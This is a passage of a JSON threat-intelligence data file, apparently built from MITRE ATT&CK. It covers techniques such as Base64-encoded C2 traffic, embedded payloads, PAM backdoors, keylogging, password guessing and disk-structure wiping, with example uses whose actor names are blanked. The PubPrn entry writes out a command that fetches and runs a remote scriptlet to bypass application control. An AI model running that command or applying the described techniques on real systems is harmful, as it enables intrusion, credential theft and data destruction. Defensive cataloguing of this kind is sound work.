      "encodes C2 traffic with Base64.",
      "has used a custom base64 key to encode stolen data before exfiltration.",
      "has encoded binary data with Base64 and ASCII.",
      "network traffic is Base64-encoded plaintext.",
      "has used tools to encode C2 communications including Base64 encoding.",
      "obfuscates communications with the C2 server using Base64 encoding.",
      "uses Base64 encoding for communication in the message body of an HTTP request.",
      "can use Base64 to encode information sent to its C2.",
      "has used basE91 encoding along with encryption for C2 communication.",
      "can encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server.",
      "can base64 encode data sent in C2 communications prior to its encryption.",
      "has used Base64 to encode its C2 traffic.",
      "can Base64 encode process output sent to C2.",
      "can use base64 encoded C2 communications.",
      "Some  samples use a custom method for C2 traffic that utilizes Base64.",
      "has returned C2 data as encoded ASCII.",
      "encodes C&C communication using Base64.",
      "can use Base64 encoded JSON libraries used in C2.",
      "has encoded C2 traffic in hexadecimal format.",
      "has used Zlib to compress C2 communications data before encrypting it.",
      "exfiltrates data using cookie values that are Base64-encoded.",
      "can use Base64 URL-safe Base64 or NetBIOS encoding in its C2 traffic.",
      "An  HTTP malware variant used Base64 to encode communications to the C2 server.",
      "can Base64 encode system information sent to C2.",
      "has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.",
      "encodes the message body of HTTP traffic with Base64.",
      "can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.",
      "can Base64 encode captured credentials with `btoa()` prior to sending to C2.",
      "has used base64 to encode command and control traffic.",
      "has the ability to hex-encode collected data from an infected host.",
      "can send additional modules over C2 encoded with base64.",
      "For C2 over HTTP  encodes data with base64 and sends it via the Cookie field of HTTP requests. For C2 over DNS  converts ASCII characters into their hexadecimal values and sends the data in cleartext.",
      "has used Base64 to encode its C2 communications.",
      "can base64 encode C2 communications.",
      "has used base64 to encode its C2 traffic.",
      "has used ASCII encoding for C2 traffic.",
      "has hexadecimal and Base64 encoded C2 content.",
      "has Base64-encoded the message body of a HTTP request sent to C2.",
      "has used Googles Protobufs to serialize data sent to and from the C2 server. Additionally  has used Base64 to encode data before sending to the C2 server.",
      "can retrieve a Base64 encoded stager from C2.",
      "uses base64 encoding in conjunction with symmetric encryption mechanisms to obfuscate command and control communications.",
      "communication includes a client-created session cookie with base64-encoded information representing information from the victim system.",
      "can use Base64 encoding to obfuscate C2 commands.",
      "performs XOR encryption and Base64 encoding of data prior to sending to command and control infrastructure.",
      "has encoded C2 traffic with Base64.",
      "During   used a VBS script to send the Base64-encoded name of the compromised computer to C2.",
      "uses Base64-encoded content in HTTP communications to command and control infrastructure.",
      "utilizes a hard-coded XOR key to encrypt the content of HTTP POST requests to command and control infrastructure.",
      "utilizes JSON objects to send and receive information from command and control nodes.",
      "can Base64-encode C2 communication.",
      "can Base64-encode and gzip compress C2 communications including command outputs.",
      "can receive Base64-encoded commands from C2."
    ],
    "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
    "similar_words": [
      "Standard Encoding"
    ],
    "id": "T1132.001"
  },
  "attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1": {
    "name": "Embedded Payloads",
    "example_uses": [
      "The DEADEYE.EMBED variant of  has the ability to embed payloads inside of a compiled binary.",
      "has an embedded second stage DLL payload within the first stage of the malware.",
      "has dropped an embedded executable at `%Temp%\\setup.exe`.",
      "has embedded  within another run-only .",
      "has used a dropper that embeds an encrypted payload as extra data.",
      "DLL has been embedded within the PowerShell script in hex format.",
      "The  source code is embedded in the dropper as an encrypted string.",
      "has embedded a XOR encrypted communications module inside the orchestrator module.",
      "can be used to embed payload data within a new image file.",
      "For  the threat actors embedded a base64-encoded payload within a LNK file.",
      "The  Queue file contains embedded executable files along with key material communication channels and modes of operation.",
      "contains a configuration blob embedded in the malware itself.",
      "can extract RC4 encrypted embedded payloads for privilege escalation.",
      "contains an embedded AES-encrypted payload labeled METADATA that provides configuration information for follow-on execution.",
      "has dropped an embedded executable at `%Temp%\\setup.exe`. Additionally  may embed entire code into other files.",
      "has embedded malicious functionality in a legitimate DLL file.",
      "contains two binaries in its resources section MultiList and MultiWip.  drops and executes each of these items when run then deletes them after execution.",
      "further decrypts information embedded via steganography using AES-CBC with the same 32 bit key as initial XOR operations combined with the first 16 bytes of the encrypted data as an initialization vector. Other  variants include encrypted chunked sections of the stage 2 payload in the initial loader .text section before decrypting and assembling these during execution.",
      "has used LNK files to execute embedded DLLs.",
      "decrypts and executes an embedded payload.",
      "contains additional embedded DLLs and configuration files that are loaded into memory during execution.",
      "embedded payloads in trojanized software for follow-on execution.",
      "has distributed malicious payloads embedded in PNG files."
    ],
    "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",
    "similar_words": [
      "Embedded Payloads"
    ],
    "id": "T1027.009"
  },
  "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771": {
    "name": "Pluggable Authentication Modules",
    "example_uses": [
      "can deactivate PAM modules to tamper with the sshd configuration.",
      "has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users."
    ],
    "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)Adversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
    "similar_words": [
      "Pluggable Authentication Modules"
    ],
    "id": "T1556.003"
  },
  "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1": {
    "name": "Revert Cloud Instance",
    "example_uses": [],
    "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
    "similar_words": [
      "Revert Cloud Instance"
    ],
    "id": "T1578.004"
  },
  "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f": {
    "name": "Gather Victim Host Information",
    "example_uses": [
      "has conducted pre-compromise reconnaissance for victim host information."
    ],
    "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).Adversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversarys follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)",
    "similar_words": [
      "Gather Victim Host Information"
    ],
    "id": "T1592"
  },
  "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca": {
    "name": "Digital Certificates",
    "example_uses": [],
    "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Digital Certificates"
    ],
    "id": "T1596.003"
  },
  "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4": {
    "name": "Keylogging",
    "example_uses": [
      "malware is capable of keylogging.",
      "During  threat actors obtained the password for the victim's password manager via a custom keylogger.",
      "is capable of logging keystrokes.",
      "can use a module to log keystrokes.",
      "can log keystrokes on compromised hosts.",
      "has the capability to install a live and offline keylogger including through the use of the `GetAsyncKeyState` Windows API.",
      "can track key presses with a keylogger module.",
      "has the capability to log keystrokes from the victims machine both offline and online.",
      "has a command to launch a keylogger and capture keystrokes on the victims machine.",
      "can perform keylogging.",
      "has used tools for capturing keystrokes.",
      "has a keylogger.",
      "has the capability to capture keystrokes.",
      "contains keylogging functionality that will monitor for active application windows and write them to the log it can handle special characters and it will buffer by default 50 characters before sending them out over the C2 infrastructure.",
      "includes keylogging capabilities for Windows Linux and macOS systems.",
      "has keylogging capabilities.",
      "contains a keylogger module that collects keystrokes and the titles of foreground windows.",
      "used a Trojan called KEYLIME to capture keystrokes from the victims machine.",
      "can perform keylogging.",
      "Get-Keystrokes Exfiltration module can log keystrokes.",
      "has a plugin for keylogging.",
      "is capable of keylogging.",
      "has used CWoolger and MPK custom-developed malware which recorded all keystrokes on an infected system.",
      "can collect keyboard events.",
      "can record keystrokes from both the keyboard and virtual keyboard.",
      "has the ability to log keystrokes on the compromised host.",
      "s dropper contains a keylogging executable.",
      "has a keylogging module.",
      "collects keystrokes from the victims machine.",
      "can track key presses with a keylogger module.",
      "contains a keylogger.",
      "has used tools to perform keylogging.",
      "has a built-in keylogger.",
      "contains a keylogger component.",
      "captures and DES-encrypts credentials before writing the username and password to a log file C:\\log.txt.",
      "contains keylogging capabilities.",
      "can use `SetWindowsHookEx` and `GetKeyNameText` to capture keystrokes.",
      "has used a keylogger.",
      "contains a keylogger.",
      "has a module for capturing keystrokes per process including window titles.",
      "has a keylogging capability.",
      "has a -based remote administration ability that can implement a PowerShell or C# based keylogger.",
      "collects keystrokes from the victim machine.",
      "When it first starts  spawns a new thread to log keystrokes.",
      "contains a keylogger.",
      "can capture all keystrokes on a compromised host.",
      "uses the CGEventTap functions to perform keylogging.",
      "can log keystrokes.",
      "gathers and exfiltrates keystrokes from the machine.",
      "can capture keystrokes on a compromised host.",
      "is capable of logging keystrokes.",
      "captures keystrokes and sends them back to the C2 server.",
      "has leveraged its keylogging capabilities to gain access to administrator accounts on target servers.",
      "has used key loggers to steal usernames and passwords.",
      "can use GetKeyState and GetKeyboardState to capture keystrokes on the victims machine.",
      "can use a module to perform keylogging on compromised hosts.",
      "contains a keylogger.",
      "has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.",
      "has the ability to capture keystrokes.",
      "has used malware with keylogging capabilities to monitor the communications of targeted entities.",
      "has used keylogging tools in their operations.",
      "has a keylogging capability.",
      "has the ability to capture input on the compromised host via keylogging.",
      "logs keystrokes via polling by using GetKeyState and VkKeyScan functions.",
      "has the ability to capture keystrokes on a compromised host.",
      "installs a keylogger for intercepting credentials and keystrokes.",
      "can log keystrokes on the victim's machine.",
      "The executable version of  has a module to log keystrokes.",
      "actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework ScanBox to capture keystrokes.",
      "uses a keylogger.",
      "logs keystrokes from the victim's machine.",
      "can continuously capture keystrokes.",
      "can capture keystrokes on a compromised host.",
      "contains a custom keylogger.",
      "contains keylogging functionality to steal passwords.",
      "will spawn a thread on execution to capture all keyboard events and write them to a predefined log file.",
      "The  Keyrecord component can capture keystrokes.",
      "can download a keylogging module.",
      "has the ability to initiate keylogging on the infected host.",
      "malware KiloAlfa contains keylogging functionality.",
      "can log keystrokes on the victim's machine.",
      "uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.",
      "logs key strokes for configured processes and sends them back to the C2 server.",
      "Malware used by  is capable of capturing keystrokes.",
      "has a feature to perform keylogging on the victims machine.",
      "can log keystrokes on the victims machine.",
      "has used several different keyloggers.",
      "has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.",
      "creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.",
      "is capable of performing keylogging.",
      "can use a plugin for keylogging.",
      "has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.",
      "can capture keystrokes on a compromised host.",
      "logs the keystrokes on the targeted system.",
      "is capable of logging keystrokes.",
      "can perform keylogging on the victims machine.",
      "uses a keylogger to capture keystrokes.",
      "logs keystrokes from the victims machine.",
      "has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.",
      "has used keylogging tools called KEYPUNCH and LONGWATCH.",
      "One of 's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.",
      "is capable of capturing keystrokes on victims.",
      "has used keylogging tools.",
      "uses a keylogger plugin to gather keystrokes.",
      "can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight Finder Safari Mail Messages and other apps that have text fields for passwords.",
      "has run a keylogger plug-in on a victim.",
      "can capture and store keystrokes.",
      "has a keylogger.",
      "contains a keylogger module.",
      "can perform keylogging.",
      "has a command for keylogging.",
      "can capture keystrokes on a compromised host.",
      "has a module to harvest pressed keystrokes.",
      "has used a PowerShell-based keylogger named `kl.ps1`.",
      "During the   gathered account credentials via a  keylogger plugin.",
      "can log keystrokes.",
      "contains keylogger functionality.",
      "was seen using a keylogger tool to capture keystrokes.",
      "has a keylogging capability.",
      "has abused the PasswordChangeNotify to monitor for and capture account password changes.",
      "During  threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.",
      "can track key presses with a keylogger module.",
      "can perform keylogging on the victims machine by hooking the functions TranslateMessage and WM_KEYDOWN.",
      "can capture keystrokes.",
      "has the ability to log keyboard events.",
      "has the ability to initiate keylogging.",
      "captures keystrokes.",
      "has a keylogging capability.",
      "has the capability to perform keylogging.",
      "can perform keylogging by polling the GetAsyncKeyState() function.",
      "is capable of recording keystrokes.",
      "has used a keylogging tool that records keystrokes in encrypted files.",
      "has the ability to capture keystrokes on an infected host.",
      "has logged the keystrokes of victims to escalate privileges.",
      "has a feature to capture a remote computer's keystrokes using a keylogger.",
      "has used keyloggers.",
      "has keylogging functionality.",
      "used a keylogger called GEARSHIFT on a target system.",
      "can capture keystrokes on the victims machine.",
      "has used a Python tool named klog.exe for keylogging.",
      "includes keylogger payloads focused on the QQ chat application.",
      "has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution.",
      "can perform keylogging operations.",
      "has the ability to support keylogging.",
      "can capture keystrokes from the victim machine.",
      "has employed keyloggers including KEYPUNCH and LONGWATCH.",
      "has used custom malware to log keystrokes."
    ],
    "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.* Reading raw keystroke data from the hardware buffer.* Windows Registry modifications.* Custom drivers.* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
    "similar_words": [
      "Keylogging"
    ],
    "id": "T1056.001"
  },
  "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9": {
    "name": "File/Path Exclusions",
    "example_uses": [
      "has placed  install files into directories that are excluded from scanning."
    ],
    "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
    "similar_words": [
      "File/Path Exclusions"
    ],
    "id": "T1564.012"
  },
  "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345": {
    "name": "Linux and Mac File and Directory Permissions Modification",
    "example_uses": [
      "has modified the permissions on binaries with chattr.",
      "has changed permissions of a second-stage payload to an executable via chmod.",
      "has the ability to modify file permissions.",
      "has used chmod to modify permissions on key files for use.",
      "can use the chmod utility to set a file as executable such as chmod 777 or chmod +x.",
      "will set the GID of `httpsd` to 90 when infected.",
      "The  binary can use `chmod` to gain full permissions to targeted files.",
      "gives all users execute permissions for the application using the command chmod +x /Users/Shared/AppStore.app.",
      "uses the chmod +x command to grant executable permissions to the malicious file.",
      "has changed file permissions of files so they could not be modified.",
      "macOS backdoor changes the permission of the file it wants to execute to 755.",
      "can add the executable flag to a downloaded file.",
      "changes the permissions of a payload using the command chmod -R 755.",
      "altered permissions on downloaded tools and payloads to enable execution on victim machines."
    ],
    "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platforms permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
    "similar_words": [
      "Linux and Mac File and Directory Permissions Modification"
    ],
    "id": "T1222.002"
  },
  "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119": {
    "name": "Password Guessing",
    "example_uses": [
      "server component can perform brute force password guessing against authentication portals.",
      "has been observed using a hard coded list of passwords to brute force user accounts.",
      "can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels.",
      "has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.  has also used a Kubernetes cluster to conduct distributed large-scale password guessing attacks.",
      "can brute force passwords for a specified user on a single target system or across an entire network.",
      "can use a list of hardcoded credentials in attempt to authenticate to SMB shares.",
      "has successfully conducted password guessing attacks against a list of mailboxes.",
      "has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and  passwords.",
      "has used a small dictionary of common passwords against a collected list of local accounts.",
      "can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.",
      "can use predefined users and passwords to execute brute force attacks against SSH FTP POP3 MySQL MSSQL and PostgreSQL services."
    ],
    "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)* SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "similar_words": [
      "Password Guessing"
    ],
    "id": "T1110.001"
  },
  "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58": {
    "name": "PubPrn",
    "example_uses": [
      "has used PubPrn.vbs within execution scripts to execute malware possibly bypassing defenses."
    ],
    "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.(Citation: pubprn)Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).",
    "similar_words": [
      "PubPrn"
    ],
    "id": "T1216.001"
  },
  "attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f": {
    "name": "Purchase Technical Data",
    "example_uses": [
      "has purchased credentials and session tokens from criminal underground forums."
    ],
    "description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victims infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
    "similar_words": [
      "Purchase Technical Data"
    ],
    "id": "T1597.002"
  },
  "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74": {
    "name": "Data from Configuration Repository",
    "example_uses": [],
    "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
    "similar_words": [
      "Data from Configuration Repository"
    ],
    "id": "T1602"
  },
  "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9": {
    "name": "Disk Structure Wipe",
    "example_uses": [
      "has been seen overwriting features of disk structure such as the MBR.",
      "has the ability to corrupt disk partitions damage the Master Boot Record (MBR) and overwrite the Master File Table (MFT) of all available physical drives.",
      "was used in  to help overwrite components of disk structure like the MBR and disk partitions.",
      "can overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader.",
      "has used a custom MBR wiper named BOOTWRECK to render systems inoperable.",
      "has used the  KillDisk component to corrupt the infected system's master boot record.",
      "malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.",
      "overwrites the first sector of the Master Boot Record with 0x00.",
      "can wipe the master boot record of an infected computer.",
      "has the ability to destroy information about a physical drive's partitions including the MBR GPT and partition entries.",
      "has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).",
      "During  threat actors used a version of  to wipe disk drives on targeted hosts.",
      "retrieves a device handle to \\\\\\\\.\\\\PhysicalDrive0 to wipe the boot sector of a given disk.",
      "conducted destructive operations against victims including disk structure wiping via the  malware in Ukraine.",
      "opens a handle to \\\\\\\\\\\\\\\\.\\\\\\\\PhysicalDrive0 and wipes the first 512 bytes of data from this location removing the boot sector.",
      "opens and writes zeroes to the first 512 bytes of each drive deleting the MBR.  then sends the control code IOCTL_DISK_DELETE_DRIVE_LAYOUT to ensure the MBR is removed from the drive.",
      "can corrupt the file system and wipe the system drive on targeted hosts."
    ],
    "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 